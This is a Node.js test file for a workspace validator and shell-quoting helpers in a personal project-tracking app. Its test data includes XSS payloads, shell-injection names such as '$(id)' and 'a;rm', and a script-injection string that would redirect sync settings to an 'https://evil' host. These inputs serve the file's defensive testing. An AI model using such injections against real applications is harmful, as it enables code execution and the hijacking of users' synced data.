import { test } from 'node:test';
import assert from 'node:assert/strict';
import { execFileSync } from 'node:child_process';
import { validateWorkspace, shellRepoPath, safeDirPath, gitPushArgs, WORKSPACE_ID, ALL_STATUSES, filterStatusSuggestions } from './workspace-model.js';

// Invented records shaped like the live workspace. Never paste live data here.
const repo = (over = {}) => ({
  name: 'hollow-app', status: 'active', platform: 'mobile', ship: true, buildTracked: false,
  buildDeps: ['hollow.example.com'], notes: '3 uncommitted', buildStale: false,
  since: { dirty: '2026-09-30T10:00:00Z', unpushed: null, branches: { 'claude/x': '2026-09-29T08:00:00-05:00' } },
  ...over,
});
const project = (over = {}) => ({
  id: 'hollow', name: 'Hollow', status: 'active', priority: 'medium', focus: 'Ship it',
  focusTone: 'info', blockedSince: null, repos: [repo()], parity: null,
  tasks: [{ done: false, text: 'Push the branch' }], ...over,
});
const workspace = (over = {}) => ({
  ws: [project()], lists: [{ id: 'personal', name: 'Personal', icon: 'P', tasks: [] }],
  today: [], doneToday: [], inbox: [], todayDate: '2026-10-01', ...over,
});

test('a complete workspace passes', () => {
  assert.deepEqual(validateWorkspace(workspace()), { ok: true });
});

test('what the phone and the sync server write passes: numeric ids, list-<ts>, absent keys', () => {
  const w = {
    ws: [project({ status: 'parked', parity: { platforms: ['web', 'mobile'], features: [{ name: 'Sync', cov: { web: 'done', mobile: 'n/a' } }] } })],
    lists: [{ id: 'list-1727800000000', name: 'Errands', icon: 'E', tasks: [{ done: true, text: 'milk' }] }],
    today: [{ id: 1727800000000, text: 'Call the bank', done: false, addedAt: '2026-10-01T12:00:00Z' }],
    // The sync server's PATCH routes keep any numeric id a caller sends, negatives included.
    inbox: [{ id: 1727800000001, text: 'from the phone', addedAt: '2026-10-01T12:01:00Z' }, { id: -1, text: 'odd id' }],
    doneToday: [{ text: 'Push the branch', project: 'Hollow', doneAt: 1727800000002 }],
  };
  assert.deepEqual(validateWorkspace(w), { ok: true });
});

test('older records missing optional fields pass, and unknown keys pass through', () => {
  const w = { ws: [{ id: 'old', repos: [{ name: 'old-repo', branches: [] }], tasks: [] }] };
  assert.deepEqual(validateWorkspace(w), { ok: true });
});

test('free text keeps every character, since it is escaped where it renders', () => {
  const hostile = '<img src=x onerror=alert(1)> \' " \\ & ;$()';
  const w = workspace({
    ws: [project({
      name: hostile, focus: hostile, tasks: [{ text: hostile }],
      repos: [repo({ notes: hostile, ignoreBranches: [hostile], since: { branches: { [hostile]: null } } })],
    })],
    lists: [{ id: 'personal', name: hostile, icon: hostile, tasks: [{ text: hostile }] }],
    doneToday: [{ text: hostile, project: hostile }],
  });
  assert.deepEqual(validateWorkspace(w), { ok: true });
});

const HOSTILE = "x');electronAPI.setSyncConfig('https://evil','t','p');('";
const withRepo = (over) => workspace({ ws: [project({ repos: [repo(over)] })] });
const withProject = (over) => workspace({ ws: [project(over)] });
const REFUSALS = [
  ['a workspace that is not an object', null, /^workspace must be an object/],
  ['a missing ws list', {}, /^ws must be a list/],
  ['a project that is not an object', { ws: [null] }, /^ws\[0\] must be an object/],
  ['a project id with a quote', withProject({ id: HOSTILE }), /^ws\[0\]\.id /],
  ['a project id in capitals', withProject({ id: 'Hollow' }), /^ws\[0\]\.id /],
  ['a list id with a double quote', workspace({ lists: [{ id: 'a"b', tasks: [] }] }), /^lists\[0\]\.id /],
  ['a repo name with a semicolon', withRepo({ name: 'a;touch x' }), /^ws\[0\]\.repos\[0\]\.name /],
  ['a repo name with a quote', withRepo({ name: "a'b" }), /^ws\[0\]\.repos\[0\]\.name /],
  ['a platform carrying markup', withRepo({ platform: '<img src=x onerror=alert(1)>' }), /\.repos\[0\]\.platform must be one of/],
  ['an unknown repo status', withRepo({ status: 'needs-<b>' }), /\.repos\[0\]\.status /],
  ['an unknown project status', withProject({ status: 'shipped' }), /^ws\[0\]\.status /],
  ['an unknown priority', withProject({ priority: 'urgent' }), /^ws\[0\]\.priority /],
  ['a focus tone that breaks a class attribute', withProject({ focusTone: 'err" onclick="x' }), /^ws\[0\]\.focusTone /],
  ['a blockedSince that is not a date', withProject({ blockedSince: '"><img src=x>' }), /^ws\[0\]\.blockedSince /],
  ['a parity platform outside the enum', withProject({ parity: { platforms: ['<b>'], features: [] } }), /\.parity\.platforms\[0\] /],
  ['a coverage value outside the enum', withProject({ parity: { platforms: ['web'], features: [{ name: 'x', cov: { web: '<b>' } }] } }), /\.parity\.features\[0\]\.cov\.web /],
  ['a parity with no features list', withProject({ parity: { platforms: ['web'] } }), /\.parity\.features must be a list/],
  ['a feature with no cov object', withProject({ parity: { platforms: ['web'], features: [{ name: 'x' }] } }), /\.features\[0\]\.cov must be an object/],
  ['an uncommitted count carrying markup', withRepo({ uncommitted: '<b>1</b>' }), /\.repos\[0\]\.uncommitted /],
  ['a negative unpushed count', withRepo({ unpushed: -1 }), /\.repos\[0\]\.unpushed /],
  ['a buildDeps entry that fails the name rule', withRepo({ buildDeps: ['a$(id)'] }), /\.buildDeps\[0\] /],
  ['a since date that is not text', withRepo({ since: { dirty: 5 } }), /\.since\.dirty /],
  ['a branch date that is not text', withRepo({ since: { branches: { main: 5 } } }), /\.since\.branches\["main"\] /],
  ['a project with no repos list', withProject({ repos: undefined }), /^ws\[0\]\.repos must be a list/],
  ['a project with no tasks list', withProject({ tasks: undefined }), /^ws\[0\]\.tasks must be a list/],
  ['a task whose text is not text', withProject({ tasks: [{ text: 5 }] }), /^ws\[0\]\.tasks\[0\]\.text /],
  ['a today id with a quote', workspace({ today: [{ id: "1'2", text: 'x' }] }), /^today\[0\]\.id /],
  ['an inbox item with no text', workspace({ inbox: [{ id: 1 }] }), /^inbox\[0\]\.text /],
  ['a todayDate that is not a date', workspace({ todayDate: 'tomorrow' }), /^todayDate /],
];
for (const [name, w, pattern] of REFUSALS) {
  test(`refuses ${name}`, () => {
    const result = validateWorkspace(w);
    assert.equal(result.ok, false);
    assert.match(result.error, pattern);
  });
}

test('the validator never changes what it checks', () => {
  const w = workspace({ ws: [project({ id: HOSTILE })] });
  const before = JSON.stringify(w);
  validateWorkspace(w);
  assert.equal(JSON.stringify(w), before);
});

test('a refusal quotes at most 60 characters of the value', () => {
  const { error } = validateWorkspace(withProject({ id: 'x'.repeat(500) }));
  assert.ok(error.length < 120, error);
});

test('WORKSPACE_ID admits every seed and live id shape', () => {
  for (const id of ['twig', 'hollow', 'loom-logos', 'claude-ai', 'list-1727800000000']) {
    assert.ok(WORKSPACE_ID.test(id), id);
  }
});

test('pickable statuses are every status but done, in picker order', () => {
  assert.deepEqual(ALL_STATUSES, ['active', 'needs-commit', 'needs-push', 'needs-merge', 'stable', 'blocked', 'parked']);
});

test('shellRepoPath joins the root and single-quotes the name, leaving ~ to the shell', () => {
  assert.equal(shellRepoPath('hollow-app', '~/github'), "~/github/'hollow-app'");
  assert.equal(shellRepoPath('x', '/Users/me/code'), "/Users/me/code/'x'");
  const out = execFileSync('/bin/sh', ['-c', 'printf %s ' + shellRepoPath('Orion Works', '~/github')], {
    encoding: 'utf8', env: { ...process.env, HOME: '/home/me' },
  });
  assert.equal(out, '/home/me/github/Orion Works');
});

test('shellRepoPath refuses every name that fails safeRepoName', () => {
  for (const name of ['', '.', '..', ' x', ' pad', "it's", "a'b", 'a;b', 'a;touch x', '$(id)', 'a`id`', null, 42]) {
    assert.equal(shellRepoPath(name, '~/github'), null, String(name));
  }
});

test('shellRepoPath refuses a root that is not a safe directory path', () => {
  for (const root of ['', '~', 'github', '~/my code', "~/it's", '~/a;b', '~/$HOME', undefined]) {
    assert.equal(shellRepoPath('x', root), null, String(root));
  }
});

test('safeDirPath admits ~ or / followed by plain segments', () => {
  for (const ok of ['~/github', '/Users/me/code', '~/.claude-personal', '~/src/work_2']) assert.ok(safeDirPath(ok), ok);
  for (const bad of ['', '~', '/', 'github', '~/', '~/a b', '~user/x', '~/a"b', '~/a`b', '~/a\nb', null]) {
    assert.equal(safeDirPath(bad), false, String(bad));
  }
});

test('status suggestions keep only known projects and pickable statuses', () => {
  const ws = [{ id: 'twig', repos: [], tasks: [] }, { id: 'hollow', repos: [], tasks: [] }];
  const raw = [
    { id: 'twig', current: 'active', suggested: 'stable', reason: 'all repos clean' },
    { id: 'nope', current: 'active', suggested: 'stable', reason: 'unknown project' },
    { id: 'hollow', current: 'active', suggested: '<img src=x onerror=alert(1)>', reason: 'markup' },
    { id: 'hollow', current: 'active', suggested: 'done', reason: 'not pickable' },
    { id: "x');alert(1);('", suggested: 'stable' },
    null,
    'stable',
  ];
  assert.deepEqual(filterStatusSuggestions(raw, ws),
    [{ id: 'twig', current: 'active', suggested: 'stable', reason: 'all repos clean' }]);
});

test('status suggestions coerce free text and survive a non-list answer', () => {
  const ws = [{ id: 'twig', repos: [], tasks: [] }];
  assert.deepEqual(filterStatusSuggestions([{ id: 'twig', current: 5, suggested: 'parked' }], ws),
    [{ id: 'twig', current: '', suggested: 'parked', reason: '' }]);
  assert.deepEqual(filterStatusSuggestions({ id: 'twig' }, ws), []);
  assert.deepEqual(filterStatusSuggestions([{ id: 'twig', suggested: 'parked' }], undefined), []);
});

test('gitPushArgs pushes named branches and refuses unsafe names', () => {
  assert.equal(gitPushArgs(), 'push');
  assert.equal(gitPushArgs([]), 'push');
  assert.equal(gitPushArgs(['main', 'claude/x-1.2_b']), "push origin 'main' 'claude/x-1.2_b'");
  assert.equal(gitPushArgs(["it's"]), null);
  assert.equal(gitPushArgs(['a;rm']), null);
  assert.equal(gitPushArgs(['-f']), null);
  assert.equal(gitPushArgs(['$(x)']), null);
});
